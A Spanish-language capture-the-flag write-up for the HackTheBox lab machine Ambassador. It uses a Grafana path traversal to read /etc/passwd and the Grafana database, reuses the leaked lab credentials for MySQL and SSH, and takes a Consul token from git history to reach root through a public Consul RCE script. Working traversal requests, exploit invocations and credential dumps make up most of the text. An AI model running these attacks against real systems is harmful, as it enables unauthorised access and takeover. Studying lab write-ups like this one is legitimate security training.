---
title: HackTheBox - Ambassador
categories: [Linux]
tags: [HackTheBox]
image: Ambassador.png
img_path: /assets/HTB/Ambassador/
---

En este post voy a explicar como resolver la máquina Ambassador de [Hack The Box](https://app.hackthebox.com/machines/Ambassador), En la que vamos a estar abusándonos de una vulnerabilidad de ```Grafana``` la cual nos permite hacer un ```Path Traversal``` y para la escalada vamos a explotar un ```RCE``` de ```consul```

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.11.183
Nmap scan report for 10.10.11.183
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date:
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date:
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info:
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, FoundRows, LongPassword, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSigpipes, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, Support41Auth, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults  
|   Status: Autocommit
|   Salt: &^TZ(\x05YqxR\x0EI:f\x03_cqkl
|_  Auth Plugin Name: caching_sha2_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
La máquina tiene abiertos los puertos 22 (SSH), 80 & 3000 (HTTP) y 3306 (MySQL).

# Enumeración

Al ingresar al servidor web que está alojado en el puerto ```80``` veremos esto.

<img src="ambassador-web80.png">

Si le damos a Read More, veremos esto.

<img src="read-more.png">

A simple vista no hay gran información, solamente un usuario llamado "developer".

Al ingresar al servidor web que está alojado en el puerto ```3000``` veremos esto

<img src="grafana-3000.png">

Grafana es un software libre de visualización y monitoreo de datos open-source. Permite crear paneles y tableros para representar datos de diferentes fuentes en una interfaz fácil de usar.

Si buscamos vulnerabilidades para este software "Grafana v8.2.0", encontraremos una que se adapta a esta versión.


```sh
$ searchsploit grafana
------------------------------------------------------------ ---------------------------  
Exploit Title                                               | Path
------------------------------------------------------------ ---------------------------
Grafana 7.0.1 - Denial of Service (PoC)                     | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py
------------------------------------------------------------ ---------------------------
```

Se trata de un "Directory Traversal", vamos a descargarnos este exploit y a ejecutarlo

```
$ python3 50581.py -H http://10.10.11.183:3000

Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```
De igual forma podemos hacer uso del comando "curl", agregándole el parámetro ```--path-as-is```, el cual nos sirve para evitar que la URL sea modificada automáticamente antes de ser enviada al servidor.

```sh
$ curl -s --path-as-is http://10.10.11.183:3000/public/plugins/barchart/../../../../../../../../etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```
Si buscamos en internet donde se almacena la base de datos de grafana, nos saldrá que se almacena en la ruta "/var/lib/grafana/grafana.db"

<img src="path-db.png">

# Ganada de acceso

```
$ curl -s --path-as-is http://10.10.11.183:3000/public/plugins/barchart/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
                                                                                                                                                                                         
$ sqlite3 grafana.db 

SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-28 20:34:17|0|{}|1|uKewFgM4z
```
Vemos que hay una contraseña, la cual se podría utilizar para conectarnos mediante MySQL como el usuario "grafana"

```
$ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0,182 sec)

MySQL [(none)]> use whackywidget;
Database changed
MySQL [whackywidget]> 
```
Si listamos las tablas de esta base de datos, veremos que hay una llamada "users", la cual contiene un usuario llamado "developer" y una contraseña que parece estar codificada en base64

```
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0,179 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

Al decodificar la contraseña veremos esto.

```sh
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```
Intentemos utilizar esta contraseña para conectarnos como el usuario "developer" por SSH.

```
$ ssh developer@10.10.11.183
developer@10.10.11.183's password: anEnglishManInNewYork027468

-bash-5.0$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
```

# Enumeración del sistema

Luego de estar un rato enumerando los distintos directorios de la máquina, en ```/opt``` hay una carpeta llamada```"my-app"``` la cual corresponde a un proyecto de GitHub, y tambien el usuario root esta corriendo ```"consul"```.

```
-bash-5.0$ ls /opt
consul  my-app
-bash-5.0$ cd /opt/my-app
-bash-5.0$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```
Si listamos los commits de este proyecto veremos esto.

```
bash-5.0$ git log --oneline
33a53ef (HEAD -> main) tidy config script
c982db8 config script
8dce657 created project with django CLI
4b8597b .gitignore
```

Si analizamos el commit "c982db8", veremos que hay un token

```
bash-5.0$ git show c982db8
commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
new file mode 100755
index 0000000..35c08f6
--- /dev/null
+++ b/whackywidget/put-config-in-consul.sh
@@ -0,0 +1,4 @@
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Si recordamos, vimos una carpeta llamada "consul", si buscamos procesos con ese nombre veremos que root lo está ejecutando, y está corriendo en el puerto 8500 (Esto lo podemos saber por los archivos de configuracion que carga).

```
bash-5.0$ ps -aux | grep "consul"
root        1087  0.4  3.9 795572 78092 ?        Ssl  20:34   0:48 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```

# Escalada de privilegios

Si buscamos posibles exploits para consul, veremos que hay una forma de tener ejecución remota de comandos.

- https://github.com/owalid/consul-rce

```
$ python3 consul_rce.py 
usage: consul_rce.py [-h] -th TARGET_HOST -tp TARGET_PORT -c COMMAND [-s SSL] [-ct CONSUL_TOKEN]
consul_rce.py: error: the following arguments are required: -th/--target_host, -tp/--target_port, -c/--command
```

Vamos a hacer un Local Port Forwarding, para traernos el puerto 8500 de la máquina víctima a nuestra máquina.

Para eso vamos a conectarnos de nuevo por SSH y vamos a hacer uso del parámetro "-L"

```
ssh developer@10.10.11.183 -L 8500:127.0.0.1:8500
developer@10.10.11.183's password: anEnglishManInNewYork027468
```

Ahora ejecutaremos el exploit y como comando le diremos que haga un "chmod u+s /bin/bash"

```
$ python3 consul_rce.py -th 127.0.0.1 -tp 8500 -ct "bb03b43b-1d81-d62b-24b5-39540ee469b5" -c "chmod u+s /bin/bash"
[+] Check nouziuouulngnlc created successfully
[+] Check nouziuouulngnlc deregistered successfully
```
Perfecto! Si miramos los permisos de la /bin/bash, veremos que es SUID

```
bash-5.0$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bash-5.0$ bash -p
bash-5.0# id
uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),1000(developer)
bash-5.0# whoami
root
```
